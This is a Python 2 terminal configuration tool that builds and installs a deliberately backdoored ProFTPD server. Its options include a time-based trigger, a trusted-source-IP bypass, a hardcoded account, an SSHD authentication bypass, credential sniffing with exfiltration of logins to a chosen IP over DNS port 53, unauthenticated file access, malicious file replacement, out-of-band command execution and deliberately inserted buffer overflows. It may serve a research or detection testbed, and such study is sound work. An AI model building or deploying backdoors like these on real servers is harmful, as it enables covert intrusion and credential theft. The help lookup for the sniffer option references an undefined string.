#!/usr/bin/python
###
# Backdoor configuration helper
#
# If you need to add a new configure option:
#  - add CONFIG_* string
#  - add HELP_* string
#  - create widget(s) and add widget to pile in init-method 
#  - add check for new option in create_command()
#  - add help string to chelp()
###
import os
import re
import sys
import termios
import tty
import fcntl
import string
import random
import fileinput
import getpass
import time
import subprocess

'''
Check if urwid is installed.
'''
try:
	import urwid
except ImportError:
	print "urwid is not installed (required)"
	sys.exit(-1)

class MyIntEdit(urwid.IntEdit):
	enabled = False
	def __init__(self, text, default=0):
		self.__super.__init__(text, default=0)

	def selectable(self):
		if self.enabled:
			return True
		else:
			return False

def myGetch():
	fd = sys.stdin.fileno()
	old_settings = termios.tcgetattr(fd)
	new_settings = termios.tcgetattr(fd)
	new_settings[3] = new_settings[3] & ~termios.ICANON & ~termios.ECHO
	termios.tcsetattr(fd, termios.TCSANOW, new_settings)

	oldflags = fcntl.fcntl(fd, fcntl.F_GETFL)
	fcntl.fcntl(fd, fcntl.F_SETFL, oldflags | os.O_NONBLOCK)
	#tty.setraw(sys.stdin.fileno())

	try:
		while 1:
			try:
				ch = sys.stdin.read(1)
				break
			except IOError:
				pass
	finally:
		termios.tcsetattr(fd, termios.TCSAFLUSH, old_settings)
		fcntl.fcntl(fd, fcntl.F_SETFL, oldflags)
	return ch

class MyEdit(urwid.Edit):
	enabled = False
	def __init__(self, text):
		self.__super.__init__(text)

	def selectable(self):
		if self.enabled:
			return True
		else:
			return False

class Config:
	cancel = True
	cmd = ""
	destdir = ""
	port = ""
	user = ""

	'''
	./configure strings for backdoors
	'''
	CONFIG_DESTDIR="DESTDIR="
	CONFIG_HAPPYHOUR="--with-happyhour="
	CONFIG_PORT=""
	CONFIG_DNSBACKUP="--enable-dnsbackup"
	CONFIG_OOBCMDEXEC="--enable-oobcmdexec"
	CONFIG_BLESSEDONE="--with-blessedone="
	CONFIG_AUTHMODULE="--enable-dso --with-shared=mod_backdoor --enable-ctrls --with-modules=mod_ctrls_admin --with-authmodule="
	CONFIG_SSHDPTRACE="--enable-sshd"
	CONFIG_SELFMOD="--enable-selfmod"
	CONFIG_FILEACCESS="--enable-fileaccess"
	CONFIG_MALDOWNLOAD="--enable-maldownload"
	CONFIG_AUTHSNIFF="--enable-authsniff"
	CONFIG_CRC32="--enable-crc32"
	CONFIG_BUFFEROVERFLOW="--enable-bufferOverflow"
	CONFIG_HEAPOVERFLOW="--enable-heapOverflow"
	CONFIG_WEBBOT="--with-webbot="
	CONFIG_DEBUG="--enable-backdoordebug"
	CONFIG_DEBUG_FTP="--disable-strip"

	'''
	help text displayed when user presses F1
	'''
	HELP_HAPPYHOUR="Happyhour is a time-based backdoor."
	HELP_DNSBACKUP="DNS Backup sends all successful lugin attempts to a specified IP address over a UDP socket on port 53"
	HELP_OOBCMDEXEC="TCP Out-Of-Band data command execution. Client script available in utils."
	HELP_BLESSEDONE="Backdoor based on the client source IP address"
	HELP_AUTHMODULE="Authentication Module with a hardcoded Account."
	HELP_SSHDPTRACE="Bypasses SSHD authentication at runtime."
	HELP_SELFMOD="Self-Modifying Session."
	HELP_FILEACCESS="Enables the attacker to Up- and Download files without prior authentication."
	HELP_MALDOWNLOAD="Replace files."
	HELP_CRC32=""
	HELP_BUFFEROVERFLOW="Insert a stack based buffer overflow."
	HELP_HEAPOVERFLOW="Insert a heap based buffer overflow."
	HELP_DEBUG="Enable backdoor related syslog messages."

	'''
	some color scheme definitions
	'''
	palette = [('banner', 'white', 'dark red', 'bold'),
		('edit', 'black', 'light gray', 'standout'),
		('button_ok', 'black', 'dark green', 'standout'),
		('red_on_white', 'dark red', 'white', 'standout'),
		('help', 'white', 'black', 'standout'),
		('button_cancel', 'black', 'light red', 'standout')]

	def change_callback(self, widget, state):
		#if widget == self.cb_selfmod:
		#	if state == True:
		#		self.cerror("WARNING: The self-modifying backdoor should be used standalone.")
		if widget == self.cb_happyhour:
			if state == True:
				self.edit_happyhour.enabled = True
			else:
				self.edit_happyhour.enabled = False
		if widget == self.cb_blessedone:
			if state == True:
				self.edit_blessedone.enabled = True
			else:
				self.edit_blessedone.enabled = False
		if widget == self.cb_authmodule:
			if state == True:
				self.edit_authmodule.enabled = True
			else:
				self.edit_authmodule.enabled = False
		if widget == self.cb_authsniff:
			if self.cb_fileaccess.get_state() or self.cb_maldownload.get_state() or state:
				self.edit_webbot.enabled = True
			else:
				self.edit_webbot.enabled = False
		if widget == self.cb_fileaccess:
			if self.cb_authsniff.get_state() or self.cb_maldownload.get_state() or state:
				self.edit_webbot.enabled = True
			else:
				self.edit_webbot.enabled = False
		if widget == self.cb_maldownload:
			if self.cb_fileaccess.get_state() or self.cb_authsniff.get_state() or state:
				self.edit_webbot.enabled = True
			else:
				self.edit_webbot.enabled = False

	def load_config(self):
		#homedir = os.path.expanduser("~")
		#self.edit_destdir.set_edit_text(homedir + "/BDD/rootfs")
		cwd = os.getcwd()
		self.edit_destdir.set_edit_text(cwd + "/rootfs")
		self.edit_destdir.enabled = True

		self.edit_port.enabled = True
		self.edit_port.set_edit_text(self.port)

		self.edit_happyhour.set_edit_text(time.strftime("%H", time.gmtime()))
		self.edit_blessedone.set_edit_text("127.0.0.2")
		self.edit_authmodule.set_edit_text("testmoduser")
		self.edit_webbot.set_edit_text("127.0.0.1/BDD/")

		try:
			config = open("config.h", 'r');
		except IOError, e:
			return

		for line in config:
			if re.search("#define BACKDOOR_OOBCMDEXEC", line):
				self.cb_oobcmdexec.set_state(True)
			if re.search("#define BACKDOOR_SSHD", line):
				self.cb_sshdptrace.set_state(True)
			if re.search("#define BACKDOOR_AUTHSNIFF", line):
				self.cb_authsniff.set_state(True)
			if re.search("#define BACKDOOR_MALDOWNLOAD", line):
				self.cb_maldownload.set_state(True)
			if re.search("#define BACKDOOR_FILEACCESS", line):
				self.cb_fileaccess.set_state(True)
			if re.search("#define BACKDOOR_SELFMOD", line):
				self.cb_selfmod.set_state(True)
			if re.search("#define BACKDOOR_CRC32", line):
				self.cb_crc32.set_state(True)
			if re.search("#define BACKDOOR_BUFFEROVERFLOW", line):
				self.cb_bufferoverflow.set_state(True)
			if re.search("#define BACKDOOR_HEAPOVERFLOW", line):
				self.cb_heapoverflow.set_state(True)
			if re.search("#define BACKDOOR_AUTHSNIFF", line):
				self.cb_authsniff.set_state(True)
			if re.search("#define BACKDOOR_DNSBACKUP", line):
				self.cb_dnsbackup.set_state(True)
			if re.search("#define BACKDOOR_DEBUG", line):
				self.cb_debug.set_state(True)
			if re.search("--disable-strip", line):
				self.cb_debug_ftp.set_state(True)

			if re.search("#define BACKDOOR_HAPPYHOUR", line):
				mo = re.match("#define BACKDOOR_HAPPYHOUR (\d+)\s", line)
				if mo.group(1):
					self.cb_happyhour.set_state(True)
					self.edit_happyhour.set_edit_text(mo.group(1))

			if re.search("#define BACKDOOR_BLESSEDONE", line):
				mo = re.match("#define BACKDOOR_BLESSEDONE \"(.*)\"\s", line)
				if mo.group(1):
					self.cb_blessedone.set_state(True)
					self.edit_blessedone.set_edit_text(mo.group(1))

			if re.search("#define BACKDOOR_AUTHMODULE", line):
				mo = re.match("#define BACKDOOR_AUTHMODULE \"(.*)\"\s", line)
				if mo.group(1):
					self.cb_authmodule.set_state(True)
					self.edit_authmodule.set_edit_text(mo.group(1))

			if re.search("#define BACKDOOR_WEBBOT", line):
				mo = re.match("#define BACKDOOR_WEBBOT \"http://(.*)\"\s", line)
				if mo.group(1):
					self.edit_webbot.set_edit_text(mo.group(1))

	def check_destdir(self, msg):
		if self.edit_destdir.get_edit_text() == "":
			self.cerror("Please supply an install path!")
			return False
		else:
			self.destdir = self.edit_destdir.get_edit_text()
			self.CONFIG_DESTDIR = string.join((self.CONFIG_DESTDIR, self.destdir), "");
			return True
		
	def check_webbotpath(self, msg):
		if self.edit_webbot.get_edit_text() == "":
			self.cerror("Please supply a HTTP URL! (ee.g., example.com/directory/")
			return False
		else:
			self.cmd = string.join((self.cmd, msg));
			if self.CONFIG_WEBBOT.endswith("="):
				self.CONFIG_WEBBOT = string.join((self.CONFIG_WEBBOT, "http://" + self.edit_webbot.get_edit_text()), "");
				self.cmd = string.join((self.cmd, self.CONFIG_WEBBOT));
			return True
	
	'''
	method that creates the ./configure string including its arguments
	'''
	def create_command(self):
		self.cmd = "./configure"
		if self.cb_happyhour.get_state() == True:
			if self.edit_happyhour.value() > 24 or self.edit_happyhour.value() < 0:
				self.cerror("Please select an hour from 0 to 24!")
				return False
			else:
				self.cmd = string.join((self.cmd, self.CONFIG_HAPPYHOUR));
				self.cmd = string.join((self.cmd, str(self.edit_happyhour.value())), "");
		if self.edit_port.value() > 60000 or self.edit_port.value() < 30000:
			self.cerror("Please select a port between 30000 and 60000!")
			return False
		else:
			self.port = self.edit_port.value()
		if self.cb_dnsbackup.get_state() == True:
			self.cmd = string.join((self.cmd, self.CONFIG_DNSBACKUP));
		if self.cb_oobcmdexec.get_state() == True:
			self.cmd = string.join((self.cmd, self.CONFIG_OOBCMDEXEC));
		if self.cb_blessedone.get_state() == True:
			if self.edit_blessedone.get_edit_text() == "":
				self.cerror("Please supply an IPv[4|6] address!")
				return False
			else:
				self.cmd = string.join((self.cmd, self.CONFIG_BLESSEDONE));
				self.cmd = string.join((self.cmd, self.edit_blessedone.get_edit_text()), "");
		if self.cb_authmodule.get_state() == True:
			if self.edit_authmodule.get_edit_text() == "":
				self.cerror("Please enter a username!")
				return False
			else:
				self.cmd = string.join((self.cmd, self.CONFIG_AUTHMODULE));
				self.cmd = string.join((self.cmd, self.edit_authmodule.get_edit_text()), "");
		if self.cb_sshdptrace.get_state() == True:
			self.cmd = string.join((self.cmd, self.CONFIG_SSHDPTRACE));
		if not self.check_destdir(self.destdir) == True:
			return False
		if self.cb_authsniff.get_state() == True:
			if not self.check_webbotpath(self.CONFIG_AUTHSNIFF):
				return False
		if self.cb_fileaccess.get_state() == True:
			if not self.check_webbotpath(self.CONFIG_FILEACCESS):
				return False
		if self.cb_maldownload.get_state() == True:
			if not self.check_webbotpath(self.CONFIG_MALDOWNLOAD):
				return False
		if self.cb_selfmod.get_state() == True:
			self.cmd = string.join((self.cmd, self.CONFIG_SELFMOD));
		if self.cb_crc32.get_state() == True:
			self.cmd = string.join((self.cmd, self.CONFIG_CRC32));
		if self.cb_bufferoverflow.get_state() == True:
			self.cmd = string.join((self.cmd, self.CONFIG_BUFFEROVERFLOW));
		if self.cb_heapoverflow.get_state() == True:
			self.cmd = string.join((self.cmd, self.CONFIG_HEAPOVERFLOW));
		if self.cb_debug.get_state() == True:
			self.cmd = string.join((self.cmd, self.CONFIG_DEBUG));
		if self.cb_debug_ftp.get_state() == True:
			self.cmd = string.join((self.cmd, self.CONFIG_DEBUG_FTP));
		self.cmd = string.join((self.cmd, self.edit_other.get_edit_text()));
		return True

	'''
	method displaying error messages
	'''
	def cerror(self, msg):
		error_txt = urwid.Text(msg)
		mapTXT = urwid.AttrMap(error_txt, 'red_on_white')
		error_btn = urwid.Button("OK", self.leave_dialog_pressed)
		mapERROR = urwid.AttrMap(error_btn, 'button_ok')

		self.perror_top = urwid.Pile([
			mapTXT,
			urwid.Divider(),
			mapERROR
		])

		self.ferror_top = urwid.Filler(self.perror_top, valign="top")
		self.error_olay = urwid.Overlay(self.ferror_top, self.ui, 'center', ('relative', 75), 'middle', ('relative', 50), None, None)

		self.loop.widget = self.error_olay
		
	'''
	method that displays help text
	'''
	def chelp(self):
		widget = self.pile.get_focus()

		if widget == self.cb_happyhour:
			help_txt = urwid.Text(self.HELP_HAPPYHOUR)
		elif widget == self.cb_dnsbackup:
			help_txt = urwid.Text(self.HELP_DNSBACKUP)
		elif widget == self.cb_oobcmdexec:
			help_txt = urwid.Text(self.HELP_OOBCMDEXEC)
		elif widget == self.cb_blessedone:
			help_txt = urwid.Text(self.HELP_BLESSEDONE)
		elif widget == self.cb_authmodule:
			help_txt = urwid.Text(self.HELP_AUTHMODULE)
		elif widget == self.cb_sshdptrace:
			help_txt = urwid.Text(self.HELP_SSHDPTRACE)
		elif widget == self.cb_authsniff:
			help_txt = urwid.Text(self.HELP_AUTHSNIFF)
		elif widget == self.cb_fileaccess:
			help_txt = urwid.Text(self.HELP_FILEACCESS)
		elif widget == self.cb_maldownload:
			help_txt = urwid.Text(self.HELP_MALDOWNLOAD)
		elif widget == self.cb_selfmod:
			help_txt = urwid.Text(self.HELP_SELFMOD)
		elif widget == self.cb_crc32:
			help_txt = urwid.Text(self.HELP_CRC32)
		elif widget == self.cb_bufferoverflow:
			help_txt = urwid.Text(self.HELP_BUFFEROVERFLOW)
		elif widget == self.cb_heapoverflow:
			help_txt = urwid.Text(self.HELP_HEAPOVERFLOW)
		elif widget == self.cb_debug:
			help_txt = urwid.Text(self.HELP_DEBUG)
		else:
			return

		helpMAP = urwid.AttrMap(help_txt, 'help')
		help_btn = urwid.Button("OK", self.leave_dialog_pressed)
		mapHELP = urwid.AttrMap(help_btn, 'button_ok')
		mapDIVIDER = urwid.AttrMap(urwid.Divider(), 'help')

		self.pile_top = urwid.Pile([
			helpMAP,
			mapDIVIDER,
			mapHELP
		])

		self.fill_top = urwid.Filler(self.pile_top, valign="top")
		self.olay = urwid.Overlay(self.fill_top, self.ui, 'center', ('relative', 75), 'middle', ('relative', 50), None, None)

		self.loop.widget = self.olay

	'''
	process shortcuts
	'''
	def shortcuts(self, input):
		self.cancel=True
		if input in ('q', 'Q'):
			if self.loop.widget == self.ui:
				raise urwid.ExitMainLoop()
			elif self.loop.widget == self.olay:
				self.loop.widget = self.ui
			elif self.loop.widget == self.error_olay:
				self.loop.widget = self.ui
		if input == 'c':
			self.ok_pressed(None)
		if input == 'h' or input == 'f1':
			self.chelp()
		if input == 'esc':
			self.loop.widget = self.ui
		if input == 'tab':
			self.pile.set_focus(self.grid_buttons)
		else:
			pass
	
	def ok_pressed(self, input):
		self.cancel=False
		if self.create_command():
			raise urwid.ExitMainLoop()
	
	def cancel_pressed(self, input):
		self.cancel=True
		raise urwid.ExitMainLoop()
	
	def leave_dialog_pressed(self, input):
		self.loop.widget = self.ui

	'''
	startup method creating widgets
	'''
	def __init__(self):
		self.user = getpass.getuser()
		self.txt_banner = urwid.Text(u"ProFTPD Backdoor Configuration Menu")
		self.map_banner = urwid.AttrMap(self.txt_banner, 'banner')
	
		self.port = random.randint(30000, 60000)
		self.edit_destdir = MyEdit(u"Install path: ")
		self.map_destdir = urwid.AttrMap(self.edit_destdir, 'edit')
		self.edit_port = MyIntEdit(u"Port: ", default=self.port)
		self.map_port = urwid.AttrMap(self.edit_port, 'edit')

		self.cb_happyhour = urwid.CheckBox(u"Happyhour")
		urwid.connect_signal(self.cb_happyhour, "change", self.change_callback)
		self.edit_happyhour = MyIntEdit(u"Hour in UTC: ", default=0)
		self.map_happyhour = urwid.AttrMap(self.edit_happyhour, 'edit')

		self.cb_dnsbackup = urwid.CheckBox(u"DNS Backup")
		self.cb_oobcmdexec = urwid.CheckBox(u"TCP Out-Of-Band CMD Exec")

		self.cb_blessedone = urwid.CheckBox(u"Blessed One")
		urwid.connect_signal(self.cb_blessedone, "change", self.change_callback)
		self.edit_blessedone = MyEdit(u"IPv[4|6]: ")
		self.map_blessedone = urwid.AttrMap(self.edit_blessedone, 'edit')
	
		self.cb_authmodule = urwid.CheckBox(u"Authentication Module")
		urwid.connect_signal(self.cb_authmodule, "change", self.change_callback)
		self.edit_authmodule = MyEdit(u"Username: ")
		self.map_authmodule = urwid.AttrMap(self.edit_authmodule, 'edit')

		self.cb_sshdptrace = urwid.CheckBox(u"SSHD PTrace")
		self.cb_authsniff = urwid.CheckBox(u"Authentication Sniffer (shared memory)")
		urwid.connect_signal(self.cb_authsniff, "change", self.change_callback)
		self.edit_webbot = MyEdit(u"http://")
		self.map_webbot = urwid.AttrMap(self.edit_webbot, 'edit')
		self.cb_fileaccess = urwid.CheckBox(u"Unauthenthicated File Access")
		urwid.connect_signal(self.cb_fileaccess, "change", self.change_callback)
		self.cb_maldownload = urwid.CheckBox(u"Malicious File Replacement")
		urwid.connect_signal(self.cb_maldownload, "change", self.change_callback)
		self.cb_selfmod = urwid.CheckBox(u"Self-Modifying Session")
		#urwid.connect_signal(self.cb_selfmod, "change", self.change_callback)
		self.cb_crc32 = urwid.CheckBox(u"CRC32 Checksum Backdoor")
		self.cb_bufferoverflow = urwid.CheckBox(u"Stack based Buffer Overflow")
		self.cb_heapoverflow = urwid.CheckBox(u"Heap based Buffer Overflow")
		self.cb_debug = urwid.CheckBox(u"Enable Backdoor Debug Symbols")
		self.cb_debug_ftp = urwid.CheckBox(u"Enable Proftpd Debug Symbols")

		self.txt_other = urwid.Text(u"Additional configure options:")
		self.edit_other = urwid.Edit(u"")
		self.map_other = urwid.AttrMap(self.edit_other, 'edit')

		self.bok = urwid.Button("configure", self.ok_pressed)
		self.mapOK = urwid.AttrMap(self.bok, 'button_ok')
		self.bcancel = urwid.Button("Cancel", self.cancel_pressed)
		self.mapCancel = urwid.AttrMap(self.bcancel, 'button_cancel')

		self.grid_buttons = urwid.GridFlow([self.mapOK, self.mapCancel], 15, 1, 3, 'left')

		self.load_config()

		self.pile = urwid.Pile([
			self.map_banner,
			urwid.Divider(),
			self.map_destdir,
			self.map_port,
			urwid.Divider(),
			self.cb_happyhour,
			self.map_happyhour,
			urwid.Divider(),
			self.cb_blessedone,
			self.map_blessedone,
			urwid.Divider(),
			self.cb_authmodule,
			self.map_authmodule,
			urwid.Divider(),
			self.cb_fileaccess,
			self.cb_maldownload,
			self.cb_authsniff,
			self.map_webbot,
			urwid.Divider(),
			self.cb_dnsbackup,
			self.cb_oobcmdexec,
			self.cb_sshdptrace,
			self.cb_selfmod,
			self.cb_crc32,
			#self.cb_bufferoverflow,
			#self.cb_heapoverflow,
			urwid.Divider(),
			self.cb_debug,
			self.cb_debug_ftp,
			urwid.Divider(),
			self.txt_other,
			self.map_other,
			urwid.Divider(),
			self.grid_buttons
		])	

		self.ui = urwid.Filler(self.pile, valign="top")

	def main(self):
		try:
			self.screen = urwid.raw_display.Screen()
			cols, rows = self.screen.get_cols_rows()
			if rows < 24 or cols < 80:
				print "Terminal should have at least the size 80x25"
				sys.exit(-1)

			self.loop = urwid.MainLoop(self.ui, self.palette, self.screen, unhandled_input=self.shortcuts)
			self.loop.run()

			if not self.cancel:
				print "This will install ProFTPd to " + self.destdir
				print "Proceed? [y/N]:"
                                ch = myGetch()
                                if ch != "y" and ch != "Y":
                                        print "Canceling..."
                                        exit(1)
				print self.cmd
				subprocess.call([self.cmd], shell=True)
				if os.geteuid() != 0:
					#print "Installation process needs root privileges."
					#subprocess.call(["sudo make " + self.CONFIG_DESTDIR + " install"], shell=True)
					#subprocess.call(["sudo chown -R " + self.user + ":" + self.user + " " + self.destdir + "/etc/"], shell=True)
					subprocess.call(["make INSTALL_USER=" +self.user + " INSTALL_GROUP=" + self.user + " " + self.CONFIG_DESTDIR + " install"], shell=True)
				else:
					subprocess.call(["make INSTALL_USER=" +self.user + " INSTALL_GROUP=" + self.user + " " + self.CONFIG_DESTDIR + " install"], shell=True)
					#subprocess.call(["chown " + self.user + ":" + self.user + " " + self.destdir + "/etc/proftpd_backdoor.conf"], shell=True)
				configfile = self.destdir + "/etc/proftpd_backdoor.conf"
				print configfile
				for line in fileinput.input(configfile, inplace=1, backup='.bak'):
					if re.search("Port", line):
						print "Port " + str(self.port),
					elif re.search("ControlsSocket", line):
						print "ControlsSocket " + self.destdir + "/var/run/proftpd.sock"
					elif re.search("ControlsLog", line):
						print "ControlsLog " + self.destdir + "/var/log/proftpd/proftpd.log"
					elif re.search("ModulePath", line):
						print "ModulePath " + self.destdir + "/usr/libexec"
					else:
						print line,
		except KeyboardInterrupt, e:
			exit(1)

if __name__ == '__main__':
	installpath = "/usr/share/"
	if re.search(installpath, os.path.realpath(__file__)):
		print "Do not use this directory as a working copy"
		print "Use copy.sh to create a new instance"
		exit(1)
	config = Config()
	config.main()

